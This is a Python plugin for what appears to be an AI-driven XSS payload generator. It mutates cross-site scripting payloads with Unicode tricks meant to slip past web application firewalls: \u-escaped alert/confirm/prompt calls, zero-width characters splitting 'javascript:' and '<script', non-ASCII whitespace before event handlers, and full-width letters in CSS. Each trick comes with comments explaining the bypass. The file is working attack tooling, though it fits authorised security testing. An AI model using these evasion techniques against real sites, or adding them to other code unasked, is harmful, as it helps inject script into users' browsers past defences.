from __future__ import annotations

import re

from ai_xss_generator.types import ParsedContext, PayloadCandidate

# ── Unicode constants ──────────────────────────────────────────────────────────
ZWS  = "\u200B"   # zero-width space         — invisible, stripped by some HTML parsers
ZWNJ = "\u200C"   # zero-width non-joiner    — breaks keyword regex, ignored in URI parsing
NBSP = "\u00A0"   # no-break space            — valid HTML5 whitespace, not ASCII 0x20
EN_SPACE = "\u2002"  # en space              — valid HTML5 whitespace
EM_SPACE = "\u2003"  # em space              — valid HTML5 whitespace


# ── Helpers ────────────────────────────────────────────────────────────────────

def _js_unicode_escape(s: str) -> str:
    """Replace every ASCII alpha char with its \\uXXXX JS identifier escape.

    The *resulting string*, when placed inside an HTML event-handler attribute
    and evaluated by a JS engine, is treated as valid JS — browsers expand
    \\uXXXX inside identifier tokens before name resolution.
    WAFs that pattern-match on literal function names (alert, confirm, etc.)
    are bypassed because the raw bytes no longer contain those strings.
    """
    return "".join(
        f"\\u{ord(c):04X}" if c.isascii() and c.isalpha() else c
        for c in s
    )


def _to_fullwidth(s: str) -> str:
    """Shift printable ASCII (U+0021–U+007E) into the Unicode full-width block
    (U+FF01–U+FF5E).  Full-width Latin letters look identical to ASCII in most
    fonts, but are distinct code points — they bypass WAFs that match on the
    ASCII bytes of a keyword.
    """
    return "".join(
        chr(ord(c) + 0xFEE0) if 0x21 <= ord(c) <= 0x7E else c
        for c in s
    )


def _insert_zws(text: str, keyword: str, pos: int = 3) -> str:
    """Insert ZWS into every occurrence of *keyword* at character position *pos*.

    Example: _insert_zws("javascript:", "javascript", 4)
             → "java\u200Bscript:"
    """
    mangled = keyword[:pos] + ZWS + keyword[pos:]
    return text.replace(keyword, mangled)


# ── Mutator ────────────────────────────────────────────────────────────────────

class UnicodeMutators:
    name = "unicode-mutators"

    def mutate(
        self,
        payloads: list[PayloadCandidate],
        context: ParsedContext,
    ) -> list[PayloadCandidate]:
        mutated: list[PayloadCandidate] = []

        for payload in payloads[:15]:
            text = payload.payload

            # ── 1. JS unicode escape: first letter of call target ──────────────
            # <img onerror=alert(1)>  →  <img onerror=\u0061lert(1)>
            # JS engines expand \uXXXX in identifier tokens; browsers execute it.
            # Bypasses WAFs doing literal string match on alert/confirm/prompt.
            for fn in ("alert", "confirm", "prompt"):
                if f"{fn}(" in text:
                    escaped = f"\\u{ord(fn[0]):04X}" + fn[1:]
                    variant = text.replace(f"{fn}(", f"{escaped}(", 1)
                    mutated.append(PayloadCandidate(
                        payload=variant,
                        title=f"{payload.title} (JS \\u escape: {fn[0]}→\\u{ord(fn[0]):04X})",
                        explanation=(
                            f"JS identifier escape: the '{fn[0]}' in '{fn}' is replaced with "
                            f"'\\u{ord(fn[0]):04X}'. Browsers resolve this during JS parsing "
                            "before name lookup; WAFs matching the raw string are bypassed."
                        ),
                        test_vector=payload.test_vector,
                        tags=payload.tags + ["mutated", "unicode", "js-escape"],
                        target_sink=payload.target_sink,
                        framework_hint=payload.framework_hint,
                        source="mutator",
                    ))
                    break  # one JS-escape variant per payload

            # ── 2. Fully JS-escaped call expression ───────────────────────────
            # alert(1)  →  \u0061\u006C\u0065\u0072\u0074(1)
            # A deeper variant: escape every letter in the function name.
            # Defeats WAFs that apply partial-match heuristics.
            for fn in ("alert", "confirm", "prompt"):
                if f"{fn}(" in text:
                    fully_escaped = _js_unicode_escape(fn)
                    variant = text.replace(f"{fn}(", f"{fully_escaped}(", 1)
                    mutated.append(PayloadCandidate(
                        payload=variant,
                        title=f"{payload.title} (full JS \\u escape: {fn})",
                        explanation=(
                            f"Every letter of '{fn}' replaced with \\uXXXX JS escapes "
                            f"({_js_unicode_escape(fn)}). No ASCII fragment of the "
                            "original name survives in the raw bytes."
                        ),
                        test_vector=payload.test_vector,
                        tags=payload.tags + ["mutated", "unicode", "js-escape", "full-escape"],
                        target_sink=payload.target_sink,
                        framework_hint=payload.framework_hint,
                        source="mutator",
                    ))
                    break

            # ── 3. ZWS inside javascript: URI ─────────────────────────────────
            # href="javascript:alert(1)"  →  href="java​script:alert(1)"
            # Tested to work in Firefox (ZWS stripped before URI scheme check).
            # WAFs matching 'javascript:' literally miss the split keyword.
            js_uri_ctx = any(
                kw in text.lower()
                for kw in ("href=", "src=", "action=", "data=", "formaction=")
            )
            if "javascript:" in text.lower() and js_uri_ctx:
                variant = re.sub(
                    r'javascript:',
                    lambda _: f"java{ZWS}script:",
                    text,
                    flags=re.IGNORECASE,
                )
                if variant != text:
                    mutated.append(PayloadCandidate(
                        payload=variant,
                        title=f"{payload.title} (ZWS in javascript: URI)",
                        explanation=(
                            "Zero-width space (U+200B) inserted into 'javascript:' URI scheme "
                            "after 'java'. Some browsers strip ZWS before scheme resolution; "
                            "WAFs pattern-matching on 'javascript:' are bypassed."
                        ),
                        test_vector=payload.test_vector,
                        tags=payload.tags + ["mutated", "unicode", "zero-width", "uri-bypass"],
                        target_sink=payload.target_sink,
                        framework_hint=payload.framework_hint,
                        source="mutator",
                    ))

            # ── 4. ZWNJ inside javascript: URI ────────────────────────────────
            # Same technique as above but using ZWNJ (U+200C) — some WAFs block
            # ZWS specifically after public disclosure; ZWNJ is a separate code point.
            if "javascript:" in text.lower() and js_uri_ctx:
                variant = re.sub(
                    r'javascript:',
                    lambda _: f"java{ZWNJ}script:",
                    text,
                    flags=re.IGNORECASE,
                )
                if variant != text:
                    mutated.append(PayloadCandidate(
                        payload=variant,
                        title=f"{payload.title} (ZWNJ in javascript: URI)",
                        explanation=(
                            "Zero-width non-joiner (U+200C) inserted into 'javascript:' URI. "
                            "A second zero-width variant complementing ZWS; different code point "
                            "so defeats WAF rules that specifically block U+200B."
                        ),
                        test_vector=payload.test_vector,
                        tags=payload.tags + ["mutated", "unicode", "zero-width", "zwnj", "uri-bypass"],
                        target_sink=payload.target_sink,
                        framework_hint=payload.framework_hint,
                        source="mutator",
                    ))

            # ── 5. NBSP as HTML attribute whitespace separator ─────────────────
            # <img onerror=alert(1)>  →  <img\u00A0onerror=alert(1)>
            # U+00A0 is valid inter-token whitespace in HTML5.
            # WAFs expecting ASCII 0x20 between tag name and attributes miss it.
            nbsp_variant = re.sub(
                r'(<\w+)(\s+)(on\w+=)',
                lambda m: m.group(1) + NBSP + m.group(3),
                text,
                count=1,
            )
            if nbsp_variant != text:
                mutated.append(PayloadCandidate(
                    payload=nbsp_variant,
                    title=f"{payload.title} (NBSP attr separator)",
                    explanation=(
                        "No-break space (U+00A0) replaces ASCII space between the tag name "
                        "and its event-handler attribute. HTML5 parsers accept it as whitespace; "
                        "WAFs checking for ASCII 0x20 before attribute names are bypassed."
                    ),
                    test_vector=payload.test_vector,
                    tags=payload.tags + ["mutated", "unicode", "nbsp", "whitespace-bypass"],
                    target_sink=payload.target_sink,
                    framework_hint=payload.framework_hint,
                    source="mutator",
                ))

            # ── 6. Em/en space variants ───────────────────────────────────────
            # Same principle; different code points for bypassing NBSP-specific rules.
            for sp_char, sp_name, sp_tag in (
                (EN_SPACE, "en space", "en-space"),
                (EM_SPACE, "em space", "em-space"),
            ):
                sp_variant = re.sub(
                    r'(<\w+)(\s+)(on\w+=)',
                    lambda m, sp=sp_char: m.group(1) + sp + m.group(3),
                    text,
                    count=1,
                )
                if sp_variant != text:
                    mutated.append(PayloadCandidate(
                        payload=sp_variant,
                        title=f"{payload.title} ({sp_name} attr separator)",
                        explanation=(
                            f"Unicode {sp_name} (U+{ord(sp_char):04X}) as attribute separator. "
                            "Complements the NBSP variant with a distinct code point — WAF rules "
                            "that explicitly allow NBSP will still miss this."
                        ),
                        test_vector=payload.test_vector,
                        tags=payload.tags + ["mutated", "unicode", sp_tag, "whitespace-bypass"],
                        target_sink=payload.target_sink,
                        framework_hint=payload.framework_hint,
                        source="mutator",
                    ))

            # ── 7. Full-width 'javascript' in CSS context ─────────────────────
            # style="background:url(javascript:alert(1))"
            # → style="background:url(ｊａｖａｓｃｒｉｐｔ:alert(1))"
            # Targets CSS parsers or WAFs that normalize full-width chars on decode.
            css_ctx = any(
                kw in text.lower()
                for kw in ("style=", "url(", "@import", "expression(")
            )
            if css_ctx and "javascript" in text.lower():
                fw_js = _to_fullwidth("javascript")
                variant = re.sub(r'javascript', fw_js, text, flags=re.IGNORECASE)
                if variant != text:
                    mutated.append(PayloadCandidate(
                        payload=variant,
                        title=f"{payload.title} (full-width 'javascript' in CSS)",
                        explanation=(
                            f"Full-width substitution: 'javascript' → '{fw_js}' (U+FF41–U+FF5A range). "
                            "Targets CSS parsers or WAFs that apply Unicode normalization (NFKC) "
                            "after security checks — full-width folds back to ASCII on normalization."
                        ),
                        test_vector=payload.test_vector,
                        tags=payload.tags + ["mutated", "unicode", "full-width", "css-bypass"],
                        target_sink=payload.target_sink,
                        framework_hint=payload.framework_hint,
                        source="mutator",
                    ))

            # ── 8. ZWS inside <script> tag name (script-tag payloads) ─────────
            # <script>alert(1)</script>  →  <scr​ipt>alert(1)</scr​ipt>
            # Regex-based WAFs matching '<script' literally are bypassed.
            # Note: browser HTML parsers may or may not accept this — it's a
            # probe technique, not a guaranteed execution path.
            if "<script" in text.lower():
                variant = re.sub(
                    r'<(script)',
                    lambda m: f"<{m.group(1)[:3]}{ZWS}{m.group(1)[3:]}",
                    text,
                    flags=re.IGNORECASE,
                    count=1,
                )
                variant = re.sub(
                    r'</(script)',
                    lambda m: f"</{m.group(1)[:3]}{ZWS}{m.group(1)[3:]}",
                    variant,
                    flags=re.IGNORECASE,
                    count=1,
                )
                if variant != text:
                    mutated.append(PayloadCandidate(
                        payload=variant,
                        title=f"{payload.title} (ZWS in <script> tag)",
                        explanation=(
                            "Zero-width space (U+200B) inserted after 'scr' inside the <script> "
                            "tag name. WAFs regex-matching '<script' bypass; browser tolerance varies "
                            "— treat as a probe payload to test parser leniency."
                        ),
                        test_vector=payload.test_vector,
                        tags=payload.tags + ["mutated", "unicode", "zero-width", "script-tag", "probe"],
                        target_sink=payload.target_sink,
                        framework_hint=payload.framework_hint,
                        source="mutator",
                    ))

        return mutated


PLUGIN = UnicodeMutators()
